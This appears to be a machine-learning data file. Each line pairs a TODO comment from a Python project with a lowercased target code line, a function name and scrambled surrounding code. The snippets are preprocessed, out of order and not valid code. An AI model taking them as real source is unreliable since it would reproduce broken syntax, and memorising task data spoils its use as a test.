# todo: remove in v8 </s> if 'retired' in self._tags[lang]:	__init__ is_draft = True self._tags[lang].remove('draft') is_private = True LOGGER.warning('The "retired" tag in post "{0}" is now deprecated and will be removed in v8.  Use "private" instead.'.format(self.source_path))
# todo: validate </s> logger.error("caught test exception", exc_info=1)	test_manaul_exec_info_logging except Exception:
# todo: optionally enable multiple selection </s> self.table.allowsmultipleselection = false	create self.table._impl = self self.table.columnAutoresizingStyle = NSTableViewUniformColumnAutoresizingStyle self.columns = [] for i, heading in enumerate(self.interface.headings):
# todo: should make sure that all the shapes conform here, </s> max_arg = adverb_helpers.max_rank_arg(args)	transform_TiledReduce axis = syntax_helpers.unwrap_constant(expr.axis) combine = self.transform_expr(expr.combine) niters = self.shape(max_arg, axis) tile_size = self.index(self.tile_param_array, self.nesting_idx)
"name": drug,  # todo: case_name? </s> "owner_id": "-",	get_drug_resistances_from_drug_resistance_list for drug in drugs: properties = { "sensitivity": "resistant", "drug_id": drug,
# todo: perform appropriate postgres1 conversion between python datetime/mxdatetime </s> return value	convert_bind_param def convert_bind_param(self, value):
# todo use bincount! </s> return self.gaps().any()	has_gaps >>> t.has_gaps() True
'label': {}, # todo fill with a localized key </s> 'presentation_order': 0,	get_dummy_fieldoption_list { 'id': 'beefcafe', 'score_points': 100, 'trigger_field': '',
# todo: error if row_identifier is none </s> if row_identifier is not none:	_AddEvent serialized_data (Optional[bytes]): serialized form of the event. row_identifier = getattr(event, '_event_data_row_identifier', None) event_data_identifier = identifiers.SQLTableIdentifier( self._CONTAINER_TYPE_EVENT_DATA, row_identifier)
# todo: configurable timeout??? </s> syndic_dict['dead_until'] = time.time() + 60	_fire_master except SaltClientError: log.error('Unable to fire event to {0}, trying another...'.format(master)) log.critical('Unable to fire event on ANY master')
#todo add server-side input validation here (currently validated on client) </s> if 'openlmis_config' in payload:	FacilitySyncView def post(self, request, *args, **kwargs): payload = json.loads(request.POST.get('json')) for item in payload['openlmis_config']: setattr(
# todo check if result is in scope -> no evaluation necessary </s> n = dynamic.check_flow_information(flow_scope, name_str,	filter_name print 'b',  flow_scope, name_str, result while flow_scope: position) print
pass # todo </s> def handle_request(self, input):	handle_request
# todo(twd2): improve here: </s> mdoc['sender_udoc']['gravatar_url'] = (	HomeMessagesView mdoc = await message.add(self.user['_id'], udoc['_id'], content) mdoc['sender_udoc'] = await user.get_by_uid(self.user['_id'], user.PROJECTION_PUBLIC) template.gravatar_url(mdoc['sender_udoc']['gravatar'] or None)) mdoc['sendee_udoc'] = udoc
gc.collect()  # todo: see first comment above </s> ok_(repo2 is not none)	test_AnnexRepo_flyweight if isinstance(o, GitRepo) and o.path == path1])) del repo1 ok_(repo2 is repo3) ok_(repo2 == repo3)
# todo ... </s> buildcontrolonelinetext(control)	buildControlReal def buildControlReal(control): return control
return 0  # todo </s> def remainingtime(self):	remainingTime @pyqtProperty(int, notify = updated)
# todo: timeline is global, get rid of it </s> posts = [x for x in self.site.timeline if x.use_in_feeds]	gen_tasks "content_footer": self.site.config['CONTENT_FOOTER'], } if not posts: yield {
# todo: that’s a memory leak </s> log_attrs = ffi.new('pangologattr[]', length)	get_log_attrs text_p, bytestring = unicode_to_char_p(text) length = len(bytestring) + 1 pango.pango_get_log_attrs( text_p, len(bytestring), -1, language, log_attrs, length)
# todo: try/catch </s> if(int(sensor["gpio"]) not in reg_sensors):	setup_sensors reg_sensors = [] for sensor in config.get("sensors"): GPIO.setup(int(sensor["gpio"]), GPIO.IN) GPIO.add_event_detect(int(sensor["gpio"]), GPIO.RISING, callback=self.alarm, bouncetime=5000)
# todo(jflesch): python 3 problem </s> import pil.image	surface2image def surface2image(surface): Convert a cairo surface into a PIL image
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
#todo fixme: we should provide an option to create the page </s> else:	run if not item.exists(): pywikibot.output('%s doesn\'t have a wikidata item :(' % page) for claim in self.claims: if claim.getID() in item.get().get('claims'):
# todo: double-check dates </s> current_period = stakeholder.staking_agent.get_current_period()	stake password=password, worker_address=BlockchainInterface.NULL_ADDRESS) bounded_date = datetime_at_period(period=current_period) emitter.echo(f"Successfully detached worker {worker_address} from staker {staking_address}", color='green')
pass # todo </s> def test_close(conn):	test_close
# todo: if compilation failed, we can't proceed; handle this. </s> files_to_reinspect = []	run '-o', MODULE_INSPECTOR_EXE_PATH, '-outputdir', MODULE_INSPECTOR_OBJ_DIR]) with self.dirty_files_lock: files_to_reinspect = self.dirty_files
# todo: test with/without collection_dir and with/without df </s> corpus = {'a.txt': 'lorem sit amet', 'b.txt': 'lorem ipsum'}	test_compute_pairwise_sim_two_corpus def test_compute_pairwise_sim_two_corpus(tmp_path): corpus_dir = create_corpus(corpus, tmp_path) corpus_df, _ = create_df(corpus_dir, tmp_path)
# todo make it callable </s> raise valueerror("negative_sampling.sampling_type")	create else:
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	get_console_pool_info def get_console_pool_info(self, console_type):
# todo(b/131363314): the reference executor should support generating </s> self.skiptest('b/131363314')	test_consume_infinite_tf_dataset def test_consume_infinite_tf_dataset(self): @tff.tf_computation(tff.SequenceType(tf.int64)) def consume(ds):
# todo: fix this for opengl core </s> if (self._mouse_cursor.drawable and	draw_mouse_cursor There is little need to override this method; instead, subclass ``MouseCursor`` and provide your own ``draw`` method. self._mouse_visible and self._mouse_in_window):
# todo: may use sys.stdout.encoding if output_file = '-' </s> output_encoding = output_encoding or default_output_encoding	convert table.order_by(order_by[0].replace('^', '-')) export_fields = _get_export_fields(table.field_names, fields_exclude) if output_locale is not None: with rows.locale_context(output_locale):
# todo: allow child connections </s> if msg.conn != self.get_parent_conn().conn:	distrib_child_depth def distrib_child_depth(self, msg): log.add_msg_contents(msg) self.queue.put(slskmessages.ChildDepth(0))
# todo: remove when no longer checking for alias. </s> aliases = get_existing_aliases()	install hai('   To use Grow: reload your shell session OR use `source {}`,', rc_path) hai('   then type `grow` and press enter.') if aliases: hai('{red}Aliases for grow detected in: {}{/red}', ', '.join(aliases.keys()))
# todo(guillermooo): use tokens to identify requests:file. </s> if not self.compare_paths(errors.file, v.file_name()):	__call__ An instance of `ErrorInfoCollection`. v = get_active_view() _logger.debug('different view active - aborting') return
# todo: not tested against real openmrs instance </s> return should('post', url('/person/{person_uuid}/attribute', person_uuid=person_uuid), {	get_how_to_create_person_attribute def get_how_to_create_person_attribute(person_uuid, attribute_uuid, value): 'uuid': attribute_uuid, 'value': value,
# todo: the button should be styled within inputspecs </s> self.inputspecs.color_design_button("changed")	updateSpecs - Update plot widgets via sigSpecsChanged signal that need new specs, e.g. plotHf widget for the filter regions self.inputInfo.showInfo() self.sigSpecsChanged.emit() # pyFDA -> plot_widgets.updateSpecs
# todo: total hack below. implement more principled formatting. </s> def process(line):	process if not line.startswith('#'): return '    ' + line
# todo: unit tests </s> user = auth.user	get_all_registrations_smart_folder @must_be_logged_in def get_all_registrations_smart_folder(auth, **kwargs): contributed = user.node__contributed nodes = contributed.find(
# todo! don't use tostring(not unique for large arrays) </s> self._hash = hash((self.tpm.tostring(),	__init__ if self.connectivity_matrix is not None: self.connectivity_matrix.flags.writeable = False self.current_state, self.past_state,
# todo(sdake) the parameters to delete operations are highly suspect </s> pod=self.fake_pod)	test_pod_create version='1.0',
# todo: test coverage of this branch </s> logger.exception(	unsubscribe_request instance.send_activation_email(action='unsubscribe') except Exception, e: 'Error %s while submitting email to %s.', e, instance.email)
# todo(mordred) when this changes to rest, force interface=admin </s> if self.cloud_config.get_api_version('identity') != '3':	update_user user = self.get_user(name_or_id) kwargs['user'] = self.get_user_by_id(user['id'], normalize=False) kwargs.pop('domain_id', None) kwargs.pop('description', None)
# todo: change this to use assertsetequal: </s> self.assertequal(true, all(updateddoc[k] == originaldoc[k] for k in updateddoc.keys()	test_field_update_set self.assertEqual(len(updatedDoc.keys()), len(originalDoc.keys())) self.assertEqual(updatedDoc['popularity'], updated_popularity) if k not in ['_version_', 'popularity']))
raise exceptions.mpdnotimplemented  # todo </s> underscore, dash, dot and colon.	subscribe already. The name may consist of alphanumeric ASCII characters plus
# todo: find a way to not depend on a specific font </s> line = make_text(text, width, 'font-family: "arial"; font-size: 19px')	test_line_content (60, 'is a text for test')]: text = 'This is a text for test' text1, text2 = line.split_first_line() assert text2 == remaining
# todo non-spatial features, policy </s> screen, s_cat_in, s_num_in = cnn_block(*screen_channels)	simple def simple(screen_channels, minimap_channels): minimap, m_cat_in, m_num_in = cnn_block(*minimap_channels) state = Concatenate(axis=3)([screen, minimap])
# todo: go to "blazemeter" section for these settings by default? </s> self.client.address = self.settings.get("address", self.client.address)	prepare def prepare(self): super(CloudProvisioning, self).prepare() self.client.token = self.settings.get("token", self.client.token) self.client.timeout = dehumanize_time(self.settings.get("timeout", self.client.timeout))
#todo(cp16net): need to set the return code correctly </s> return wsgi.result(202)	delete models.Instance.delete(proxy_token=req.headers["X-Auth-Token"], uuid=id) LOG.info("result of delete %s" % result)
# todo: jrk: chunking times points needs to be simplified </s> parallel, p_time_gen, n_jobs = parallel_func(_fit_slices, n_jobs)	_GeneralizationAcrossTime if 'slices' not in self.train_times_: self.train_times_ = _sliding_window(epochs.times, self.train_times) n_chunks = min(len(self.train_times_['slices']), n_jobs) splits = np.array_split(self.train_times_['slices'], n_chunks)
#todo: add the whole build log? it could be several thousand </s> output.addtest(bid, package.installed, buildlogpath + '\n' +	createTestOutput with open(buildLogPath, 'rb') as F: buildLog = F.read() #TODO: this may not return all output spec.to_yaml() + buildLog) return handled[spec]
# todo: we are losing information about tables which are views here </s> self.db_tables = [table_info.name for table_info in self.introspection.get_table_list(self.cursor)]	SQLDiff self.cursor = connection.cursor() self.django_tables = self.introspection.django_table_names(only_existing=self.options['only_existing']) if self.can_detect_notnull_differ: self.load_null()
# todo: since multiclass is done internally - we need to check </s> bias = self.clf.svm.get_bias()	__sg ipshell = IPShellEmbed() ipshell() alphas = self.clf.svm.get_alphas()
# todo assuming one_hot as default for now </s> data_y = numpy.zeros((data['y'].shape[0], 10), dtype = config.floatx)	load_data data_x = data_x.reshape((data_x.shape[3], 32 * 32 * 3)) data_y = data['y'] for i in xrange(data['y'].shape[0]): data_y[i, data['y'][i] -1] = 1.
# # todo: should be able to just access the api from qml. </s> return []	foundDevices else:
# todo: save state right here </s> [returnfromkernel(kernel_name=new_kernel_name)])	inner_mapper [CallKernel(kernel_name=new_kernel_name)] + current_chunk + new_schedule.extend( [start_item] +
#todo: handle arc segments </s> i=0	execute block.append("G0 Z0") phi = atan2(segment.B[1]-segment.A[1], segment.B[0]-segment.A[0]) while i<(segment.length()+rdoc): pos=min(segment.length(), i)
# todo: these should always be unicodes </s> jdk_home=text_type(self._zinc.underlying_dist.home),	_compile_hermetic output_directories=(classes_dir,), description="zinc compile for {}".format(ctx.target.address.spec), ) res = self.context.execute_process_synchronously_or_raise(
# todo: make more reliable, modularize </s> try:	gradient_reverse config["activation"] = None layer_wo_relu = layer.__class__.from_config(config) Ys_wo_relu = layer_wo_relu(Xs) except (TypeError, AttributeError):
# todo: this test requires manifold access, see: t88318502 </s> self._test_model("coco-instancesegmentation/mask_rcnn_r_50_fpn_3x.yaml")	testMaskRCNN def testMaskRCNN(self):
# todo: find why this doesn't work with this set to 0 </s> memory_saving_gradients.min_checkpoint_node_size = 100	main def main(): old_gradients = tf.gradients
# todo: select correct protocol based on alpn (?) </s> flow.client_conn.protocol = http1.http1protocol(self.c.client_conn)	handle_flow ret = self.process_request(flow, req) if ret: if ret is not None: return ret
# todo remove in v8 </s> self.compile_html(source, dest, is_two_file)	compile def compile(self, source, dest, is_two_file=False, post=None, lang=None):
# todo_recorders - need to pass in parent info instead of none </s> metadata = create_local_meta(none, 'linearrunonce')	solve from openmdao.recorders.base_recorder import push_recording_iteration_stack, pop_recording_iteration_stack push_recording_iteration_stack('LinearRunOnce', 1) update_local_meta(metadata, (1,)) self._rec_mgr.record_iteration(self, metadata)  # no norms
# todo : pytest.mark.parametrise once nose is gone. </s> def test_collections_defaultdict():	test_collections_defaultdict a = defaultdict() a.default_factory = a
# todo: this regex could change based on project req format </s> attributes[col_headers[j]] = re.findall('[a-za-z0-9]+', cell.value)	import_xlsx if j != id_col and cell.value is not None: if 'links' == col_headers[j]: else: attributes[col_headers[j]] = cell.value
# todo: run in built-in terminal </s> error = reprounzip.unpack(self.package_widget.text(),	_unpack unpacker = self.unpackers.checkedButton() if unpacker: unpacker.text(), directory)
# todo: scale and translation could be merged into a single network </s> with tf.variable_scope("scale"):	forward_and_jacobian mask = self.get_mask(inputs, dtype=inputs.dtype) masked_inputs = inputs * mask scale = self.scale_fn(masked_inputs) with tf.variable_scope("translation"):
# todo: this logic also exists in self.use_as_template() </s> for addon in settings.addons_available:	add_default_node_addons def add_default_node_addons(sender, instance, created, **kwargs): if created and not instance.is_fork and not instance._suppress_log: if 'node' in addon.added_default: instance.add_addon(addon.short_name, auth=None, log=False)
result = np.vstack((result, result_a))          # todo: https://github.com/tensorlayer/tensorlayer/issues/288 </s> if result is none:	predict result = result_a else: if len(X) % batch_size != 0: dp_dict = dict_to_one(network.all_drop)
# todo: fails because of missing svg support </s> document = html(string='''	test_ph_embedded @assert_no_logs def test_ph_embedded(): <object data="data:image/svg+xml,<svg></svg>" align=top hspace=10 vspace=20></object>
# todo: add .data and .grad to syft tensors </s> nn_self._check_encrypted()	_hook_crypten_module crypten.nn.Module.get = module_get_ def module_share_(nn_self, *args, **kwargs): if module_is_missing_grad(nn_self): create_grad_objects(nn_self)
"""the line which triggered the message"""#todo elaborate </s> s.match = match	__new__ s.event = event s.bytes = bytes The regular expression ``MatchObject_`` for the triggering line. .. _MatchObject: http://docs.python.org/library/re.html#match-objects
# todo: use lt and rt in profile as well </s> side = left if id else rigth	get_action return profile.buttons[id] elif id in TRIGGERS: return profile.triggers[side] elif id in GYROS:
# todo unordered float </s> return fcompp(ir, instr, a, b)	fucompp def fucompp(ir, instr, a=None, b=None):
# todo: is this safe? </s> self.cmd( 'iptables -f' )	terminate def terminate( self ): self.cmd( 'iptables -t nat -F' ) self.cmd( 'sysctl net.ipv4.ip_forward=0' )
assert ts.nanosecond == 0 # todo: handle nanosecond (timestamps.pyx) </s> _time = str_2d(ts.hour) + ':' + str_2d(ts.minute) + ':' + str_2d(ts.second)	overload_pd_timestamp_isoformat return timestamp_isoformat_impl def timestamp_isoformat_impl(ts, sep): res = str(ts.year) + '-' + str_2d(ts.month) + '-' + str_2d(ts.day) + sep + _time return res
pass # todo </s> def test_get_projection(self):	test_get_projection
# todo(mnaser): uncomment this in patch resolving the issue </s> self.assertin(volume_id, self.cinder.attachments[server_id])	test_delete_with_reserved_volumes_new self.assertIn(volume_id, self.cinder.attachments[server_id]) self.api.delete_server(server['id'])
# todo query = 'query statement' </s> client = asset_v1.assetserviceclient()	search_all_resources order_by=None): from google.cloud import asset_v1 response = client.search_all_resources( scope,
# todo: validate schema </s> for i in range(len(manager.config.get('schedules', []))):	update_schedule def update_schedule(schedule_id): data = request.json if id(manager.config['schedules'][i]) == schedule_id: new_schedule = data['schedule']
# todo: add rotary inertia </s> mass = elem.mass()	build_Mgg Mbb[j1, j1] = Mbb[j1+1, j1+1] = mass / 2 elif etype in ['CBAR', 'CBEAM']: nid1, nid2 = elem.nodes i1 = dof_map[(nid1, 1)]
# todo: remove in 21.08 </s> if cache_audio_dir is not none:	generate_cache_text cache_audio_dir (path): DEPRECATED path to store .wav files cache_text_file (file): file containing the sentences LOG.warning( "the cache_audio_dir argument is deprecated. ensure the directory "
#todo make more readable </s> days = 7 if self.week_view.get_active() else 30	get_facts by_category = {} week = {"days": [], "totals": []} for i in range(days): current_date = self.monday + dt.timedelta(i)
# todo: arrange </s> self.remote.get_repos()	test_get_repos def test_get_repos(self): Test: Get repos
# todo check response </s> result = self.diagnostics.read_data_by_identifier([0x01])	test_read_data_by_identifier def test_read_data_by_identifier(self): self.assertIsInstance(result, bytearray, "Did not receive response") print("Result:", list(map(hex, result)))
# todo: use vendorid and productid </s> (vendor, product) = device	check_device def check_device(self, device): DEVICES is (VendorID, ProductID, Description) """ if vendor == "0x1002" or vendor == "0x1022": return True
#todo: issue warning that this is an unsafe operation, but doing it cause user insists </s> try:	atomic_move e = get_exception() if unsafe_writes and e.errno == errno.EBUSY: try: out_dest = open(dest, 'wb')
# todo: add the rest of the api actions here and call them directly from the api controller </s> self.shareable_service = sharable.shareableservice(self.manager, self.serializer)	__init__ self.serializer = VisualizationSerializer(app)
# todo(nakago): check why tolerance is high </s> gradient_check.check_backward(	test_backward_cpu else: params = tuple(model_no_dropout.params()) model_no_dropout, (atom_data, adj_data), y_grad, params=params,
# todo: apply _is_zero attribute </s> self._components[basis] = comp.copy()	copy_from for basis, comp in other._components.items():
# todo: skips header parsing </s> iline += 1	read_assembly line0 = lines[iline].strip().lower() elif word.startswith('nset'): line0 = lines[iline].strip().lower() set_ids = []
# todo: error handling </s> backend = plugin.get(backend, backend)()	GraphFactory def __new__(cls, backend='default', identifier=None): if not isinstance(backend, Backend): if backend.context_aware: return Node.__new__(ConjunctiveGraph, backend)
# todo: remove this assert when we're confident the code is correct </s> if not zeros.empty:	insert_zeros columns=power_columns, dtype=np.float32) zeros = zeros.sort_index() assert(timedelta64_to_secs(np.diff(zeros.index.values).min()) >
# todo: check how to be writeable only from same group </s> print("check how to be writeable only from same group")	__init__ gid = getgrnam(JtopServer.PIPE_JTOP_USER).gr_gid except KeyError: gid = os.getgid() if os.path.exists(JtopServer.PIPE_JTOP_CTRL):
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo testing </s> sys.stdout.write('asking masterdriver to forward the cov')	do_ConfirmedCOVNotifcationRequest if not isinstance(apdu, ConfirmedCOVNotificationRequest): _log.error() self.vip.rpc.call(PLATFORM_DRIVER, 'forward_bacnet_cov_value', apdu.initiatingDeviceIdentifier,
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
# todo: supports blocking queries and all consistency modes </s> defaults to the current datacenter of this agent.	services Returns the services known about in the *dc* datacenter. *dc*
assert ts.nanosecond == 0 # todo: handle nanosecond (timestamps.pyx) </s> _time = str_2d(ts.hour) + ':' + str_2d(ts.minute) + ':' + str_2d(ts.second)	timestamp_isoformat_impl def timestamp_isoformat_impl(ts, sep): res = str(ts.year) + '-' + str_2d(ts.month) + '-' + str_2d(ts.day) + sep + _time return res
# todo: must be implemented </s> pass	get_crawlers_to_search def get_crawlers_to_search(self, links):
# todo: weather data source changed, temporarily disable, will enable it later when new data source is available. </s> else:	CitiBikeToyTopology cfg = safe_load(fp) self._data_pipeline["trip"] = CitiBikeToyPipeline(start_time=cfg["start_time"], end_time=cfg["end_time"], stations=cfg["stations"], trips=cfg["trips"], topology=topology, is_temp=is_temp) logger.warning(f"Config file {config_path} for toy topology {topology} not found.") def download(self, is_force: bool = False):
# truffle todo: revert </s> for __x in _glob2(dirname, basename, dironly): yield __x	_iglob if not dirname: if recursive and _isrecursive(basename): else: for __x in _glob1(dirname, basename, dironly): yield __x
# todo should also include meta-chunk-hash </s> trailers = {'x-oio-chunk-meta-metachunk-size': metachunk_size}	_cycle_put del headers[h] metachunk_size = 9 * length self._check_not_present(chunkurl) resp, body = self._http_request(chunkurl, 'PUT', chunkdata, headers,
# todo: make truly async </s> async def get_service_accounts(self, project_id):	IAMFacade name = f'projects/{project_id}/serviceAccounts/{service_account_email}' return self._iam_client.projects().serviceAccounts().keys().list(name=name).execute() name = f'projects/{project_id}' service_accounts = []
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# todo: add flex option to the implementation </s> widget.viewport = cocoaviewport(widget.native)	add_content def add_content(self, position, widget, flex): for child in widget.interface.children: child._impl.container = widget
# todo: adapt units_qs once we allow filtering </s> units_qs = store.units	get_view_units if not limit: limit = profile.get_unit_rows() json["units"] = _filter_view_units(units_qs, int(page), int(limit)) json["success"] = True
time.sleep(.0015) # todo: tune </s> return true	_async_clear_instructions if self._repaint_requested: return False
todo: factorize once #1457 is merged. </s> returns: longitude [deg east], latitude [deg north] and altitude [m]	get_satpos def get_satpos(self): Evaluate orbit polynomials at the start time of the scan. if self.satpos is None: a, b = self.get_earth_radii()
# todo(thowe): there is a general smell here that this code is </s> auth = test_cloud.config['auth']	setUpClass if test_cloud.debug: utils.enable_logging(True, stream=sys.stdout) if 'cacert' in test_cloud.config: auth['verify'] = test_cloud.config['cacert']
# todo: maybe[int] and maybe[simple_sum] are invalid </s> return _defaultvalue(typ.children[0])	_DefaultValue return 'new List<%s>()' % (c_type) elif type_name == 'maybe': elif type_name == 'int': default = '-1'
# todo: replace with stream-changed </s> self._trigger_track_playback_started()	next self.core.tracklist.mark_playing(next_tl_track) self.core.history.add(next_tl_track.track) elif not result: self.core.tracklist.mark_unplayable(next_tl_track)
# todo -- this must not block long (!) </s> self.worksheet.restart_sage()	Worksheet_restart_sage class Worksheet_restart_sage(WorksheetResource, resource.Resource): def render(self, ctx): return http.Response(stream='done')
# todo: in 0.6.0 change this to "disabled": false </s> "enabled": true,	test_server_mode "duplicate_cn": True, "engine": "rsax", "fast_io": True, "fragment": 0,
# todo: re-enable this when https://github.com/ironlanguages/ironpython2/issues/10 is fixed </s> class someclass(object):	test_deprecated_string_exception except TypeError, e: print e.message pass try:
# todo improve logged output </s> self.logger.debug(	stop_vent_collector try: resp = requests.post(uri, data=json.dumps(payload)) 'Collector response: {0}'.format(resp.text)) response = ast.literal_eval(resp.text)
# todo: remnants from rllab -> gym conversion </s> self.set_state(qpos, qvel)	reset_model qvel[self.PUCK_INDS] = 0 qvel[self.TARGET_INDS] = 0 return self._get_obs()
# todo(ls): revert this loop to "yield from" </s> for __x in self.__cause__.format(chain=chain): yield __x	format if chain: if self.__cause__ is not None: yield _cause_message elif (self.__context__ is not None and
# todo(mriedem): move to objectlistbase.__init__ for empty lists. </s> instance_list = instance_obj.instancelist(objects=[])	_get_servers log_msg = _("Flavor '%s' could not be found ") LOG.debug(log_msg, search_opts['flavor']) if is_detail: instance_list.fill_faults()
# todo: remove references to _attachments once all forms have been migrated to riak </s> query = (formes()	get_form_ids_having_multimedia def get_form_ids_having_multimedia(domain, app_id, xmlns, startdate, enddate): .domain(domain) .app(app_id)
# todo: this is quadratic complexity </s> existingmodules = [	load_mod_from_file self.log('Rejected file: ' + fpath,level=logging.DEBUG) return m for m in self.shutit_modules if getattr(m, '__module_file', None) == fpath
print("why would this happen?")  # todo </s> return	map_subscript return if not isinstance(array, lp.GlobalArg): index = expr.index  # could be tuple or scalar index if not isinstance(index, tuple):
# steps = 0 # todo </s> luxcore_scene.deleteobject(src_name)	first_run object_ids = array("I", duplis.object_ids) luxcore_scene.DuplicateObject(src_name, dst_name, duplis.get_count(), transformations, object_ids) self._debug_info() return True
# todo(akhmerov): implement. </s> pass	test_resume_workflow def test_resume_workflow(self):
# todo(b/159180073): clean raise after fixing dataset reduce. </s> _check_dataset_reduce_in_multi_gpu(graph_def)	function_to_wrap Result of importing graphdef backing `comp`. graph_def = serialization_utils.unpack_graph_def(comp.tensorflow.graph_def) init_op = comp.tensorflow.initialize_op if init_op:
# todo: filter values. </s> return none, grad_valuea, none, grad_valueb, none, none, none	backward indexA, valueA = transpose(indexA, valueA, m, k) _, grad_valueB = mm(indexA, valueA, indexC, grad_valueC, k, m, n)
# todo: handle errors better </s> abort(	patch except sqlalchemy.exc.IntegrityError as e: db.session.rollback() code=http_exceptions.Conflict.code, message="Could not update user details."
# todo: this would be a good candidate for refactoring into a testcase subclass shared across backends </s> expected_pks = [str(i) for i in [3, 2, 4, 5, 6, 7, 8, 9, 10, 11]]	test_values_slicing reset_search_queries() self.assertEqual(len(connections['elasticsearch'].queries), 0) results = self.sqs.all().order_by('pub_date').values('pk') self.assertListEqual([i['pk'] for i in results[1:11]], expected_pks)
#todo print to stderr </s> print "need to pick a chamber"	scrape_legislation 'name':bill_desc,'bill_sponsor':bill_sponsor} else:
time.sleep(40)  # todo: should remove after polling get. </s> res = res.reconstruct()	test_mpc_matmul_public op = getattr(operator, op_str) res = op(mpc_tensor_1, value_2) expected = op(value_1, value_2) assert (res == expected).all()
# todo: deprecation 3.1 </s> @deprecated("deprecated. use log_cosh instead")	logcosh def logcosh(x): return log_cosh(x)
# todo: capture stdout for both the test assert and docs embedding </s> prob.run_model()	test_feature_iprint_1 ln_scipy.options['iprint'] = 0
# todo legacy method to be removed/refactored </s> from corehq.apps.commtrack.models import supplypointcase	set_locations def set_locations(self, locations): new_locs_set = set([loc._id for loc in locations]) old_locs_set = set([loc._id for loc in self.locations])
# todo: figure out a dynamic way of doing this </s> channels = {	Silence await self._reschedule() async def _get_related_text_channel(self, channel: VoiceChannel) -> Optional[TextChannel]: "off-topic": Channels.voice_chat, "code/help 1": Channels.code_help_voice,
# todo(b/132329316) remove when `xla.compile` allows tf.device(tpu). </s> forward = with_soft_placement(forward)	run_forward forward = tf.function(forward) if self.primary_device == "TPU": return forward()
# todo: we should probably have a special folder just for header </s> import brian2.synapses as synapses	__init__ self.include_dirs = list(prefs['codegen.cpp.include_dirs']) self.include_dirs += [os.path.join(sys.prefix, 'include')] synapses_dir = os.path.dirname(synapses.__file__) self.include_dirs.append(synapses_dir)
# todo - restore this when issue __ is fixed. </s> outputs = cr.get_case(case).outputs	test_fan_in_grouped for case in cases:
""" todo: check this description </s> retrive objects (service/host) from names	get_objects @declared def get_objects(ref): if not isinstance(ref, basestring): return ref
#todo - use a context manager here once we drop python 2.6 </s> self.assertraises(valueerror, treecluster,	test_treecluster [ 1, 1, 1, 1, 1], [ 1, 1, 1, 1, 1]], int) **{"data": data1, "mask": mask1, "weight": weight1, "transpose":0, "method": "any", "dist": "e"})
# todo: should change to 'bytes' on python3 </s> 'unsupported key type: str')	test_table_getitem_invalid_type self.assertEqual(exception_context.exception.message,
# todo: remove this - cura-4482 </s> quality = self._global_container_stack.quality	_onGlobalContainerChanged material = self._global_container_stack.material material.nameChanged.disconnect(self._onMaterialNameChanged) quality.nameChanged.disconnect(self._onQualityNameChanged) for extruder_stack in ExtruderManager.getInstance().getActiveExtruderStacks():
# todo - this needs to be a timezone un-aware timestamp </s> user.password_updated = 2	test_it_is_invalid_if_user_has_already_reset_their_password schema = ResetPasswordSchema().bind(request=pyramid_csrf_request) user = user_model.get_by_username.return_value with pytest.raises(colander.Invalid) as exc: schema.deserialize({"user": "abc123", "password": "secret"})
# todo(philday): add support for timeout (clean shutdown) </s> _vmops = self._get_vmops_for_compute_node(instance['node'])	migrate_disk_and_power_off timeout=0, retry_interval=0): off the instance before the end. return _vmops.migrate_disk_and_power_off(context, instance, dest, flavor)
# todo(laigd): remove this check when 312743821 is in the release. </s> if use_tf_function and tf.compat.v1.__version__ < '2.3.0':	CallDefunTest ) def testSimple(self, use_tf_function): return FLAGS.call_defun_use_tf_function = use_tf_function
#todo(ziad): use a more sophisticated proxy </s> return response(status=resp.status, body=data)(env, start_response)	__call__ resp = conn.getresponse() data = resp.read()
# todo: log in browser as a session </s> return flask.redirect('/account')	register_post 'error': "A user with that email already exists." }
# todo files listed here may not belong to the given camera </s> return picture_files	list_pictures full_paths = _list_media_files(target_dir, exts=_PICTURE_EXTS) picture_files = [p[len(target_dir):] for p in full_paths]
raise notimplementederror #todo </s> if i != l:	parse raise NotImplementedError #TODO elif q.kw(i,"REQUEST"): raise SyntaxError("Expected end of query, got " + q[i])
# todo candidate for move to system/osi as not btrfs related </s> smap = {	convert_to_KiB def convert_to_KiB(size): 'KiB': 1, 'MiB': 1024,
# todo catch error here </s> self._nb.addpage(view, basename(filename))	menu_file_open view = RegistryFileView(self._nb, registry=registry, filename=filename)
# todo resource arns may contain wildcards, e.g. arn:aws:iam::*:role/admin -- </s> session.run(	load_group_policies role_arns = [role_arns] for role_arn in role_arns: ingest_policies_assume_role, GroupName=group_name,
# todo: safe labels </s> record = self.row_to_dict(row, labels)	fact row = cursor.fetchone() if row: else: record = None
# todo test </s> return notimplemented	__eq__ return hash(item) == hash(self)
# todo: look into nonce prefix </s> nonce = nacl.utils.random(nacl.public.box.nonce_size)	user_sendroomkey def user_sendroomkey(self, name): if self.init_pubkey(name): enc = self.boxes[name].encrypt(self.shared_key, nonce) self.send_cmd.msg_send_sharekey(name, enc)
# todo implement. </s> raise notimplementederror	process_epoch def process_epoch(self, e):
# todo(yanase): implement maximization. </s> if direction == 'maximize':	_set_direction def _set_direction(self, direction=None): raise ValueError( 'Optimization direction of study {} is set to \'maximize\'. '
# todo: hack, this may be called differently in other agents (replace by root-policy). </s> variables = self_.call(self_.sub_components["policy"]._variables)	update_from_external_batch_for_root def update_from_external_batch_for_root(self_, *inputs): return self_.call(root_optimizer.step, variables, *inputs)
# todo: some message needed? </s> pass	create_arc if type == 'Equiv': if old_type == "Equiv": else: assert old_type is None, 'attempting to change Equiv, not supported'
# todo: fix this upstream </s> for header in headers:	csv_for for result in results: row = [] if (header != "HSTS Header") and (header != "HSTS Max Age") and (header != "Redirect To"): if result[header] is None:
